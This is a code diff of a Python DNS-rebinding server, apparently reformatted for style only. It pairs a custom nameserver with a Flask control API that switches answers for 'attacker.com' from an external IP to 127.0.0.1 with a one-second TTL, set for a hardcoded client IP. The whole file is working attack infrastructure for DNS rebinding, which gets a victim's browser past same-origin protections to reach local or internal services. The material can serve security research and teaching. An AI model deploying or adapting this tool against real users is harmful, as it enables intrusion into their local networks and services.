@@ -5,10 +5,11 @@ import time
 import sys
 from flask import Flask, request
 
-HOST = "0.0.0.0" 
+HOST = "0.0.0.0"
 WEBSERVER_PORT = 80
 DNS_PORT = 53
 app = Flask(__name__)
+
 
 class Record:
     records = []
@@ -16,7 +17,7 @@ class Record:
     def __init__(self, ip, responses):
         self.ip = ip
         self.responses = responses
-        self.is_first = True  
+        self.is_first = True
 
         # replace record if one already exists for this ip
         r = Record.get_record(ip)
@@ -32,11 +33,13 @@ class Record:
                 record = Record.records[r]
         return record
 
+
 class Response:
     def __init__(self, hostname, ip, ttl):
         self.hostname = hostname
         self.ip = ip
         self.ttl = ttl
+
 
 class DNSRequestHandler(socketserver.BaseRequestHandler):
     def get_data(self):
@@ -65,7 +68,7 @@ class DNSRequestHandler(socketserver.BaseRequestHandler):
         except Exception:
             print("Couldn't handle DNS request: {}".format(data))
             self.send_data(data)
-    
+
     def try_add_answer(self, dns_request, client_ip):
         # if a record exists for the client ip, add an answer
         record = Record.get_record(client_ip)
@@ -75,9 +78,14 @@ class DNSRequestHandler(socketserver.BaseRequestHandler):
                 response = record.responses[0]
             else:
                 response = record.responses[1]
-                
-            print("returning hostname: {}; ip: {}; ttl: {}".format(response.hostname, response.ip, response.ttl))
+
+            print(
+                "returning hostname: {}; ip: {}; ttl: {}".format(
+                    response.hostname, response.ip, response.ttl
+                )
+            )
             dns_request.add_answer(response.hostname, response.ip, response.ttl)
+
 
 def main():
     print("Starting nameserver...")
@@ -88,18 +96,27 @@ def main():
     thread.start()
 
     try:
-        Record.records.append(Record("86.80.57.210", [Response("attacker.com", "13.95.7.28", 1), Response("attacker.com", "127.0.0.1", 1)]))
+        Record.records.append(
+            Record(
+                "86.80.57.210",
+                [
+                    Response("attacker.com", "13.95.7.28", 1),
+                    Response("attacker.com", "127.0.0.1", 1),
+                ],
+            )
+        )
         app.run(host=HOST, port=WEBSERVER_PORT)
     except KeyboardInterrupt:
         pass
     finally:
         server.shutdown()
 
-@app.route('/add-dns')
+
+@app.route("/add-dns")
 def add_record():
     # TODO check input
-    ip = request.args.get('ip')
-    responses_raw = request.args.getlist('responses')
+    ip = request.args.get("ip")
+    responses_raw = request.args.getlist("responses")
     if len(responses_raw) != 2:
         return "Expected 2 responses, actually got: {}".format(len(responses_raw))
     responses = []
@@ -113,36 +130,40 @@ def add_record():
 
     # create new record
     Record(ip, responses)
-    return 'Record created'
+    return "Record created"
 
-@app.route('/second-dns')
+
+@app.route("/second-dns")
 def second_dns():
-    ip = request.args.get('ip')
+    ip = request.args.get("ip")
     record = Record.get_record(ip)
     if record is None:
         return "Record for ip {} not found".format(ip)
     record.is_first = False
     return "Record for ip {} set to second".format(ip)
 
-@app.route('/reset-dns')
+
+@app.route("/reset-dns")
 def reset_record():
-    ip = request.args.get('ip')
+    ip = request.args.get("ip")
     record = Record.get_record(ip)
     if record is None:
         return "Record for ip {} not found".format(ip)
 
     # reset the status of this record to return the first response again
-    record.is_first = True 
+    record.is_first = True
     return "Record for ip {} reset".format(ip)
 
-@app.route('/delete-dns')
+
+@app.route("/delete-dns")
 def delete_record():
-    ip = request.args.get('ip')
+    ip = request.args.get("ip")
     record = Record.get_record(ip)
     if record is None:
         return "Record for ip {} not found".format(ip)
     Record.records.remove(record)
     return "Record for ip {} removed".format(ip)
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     main()
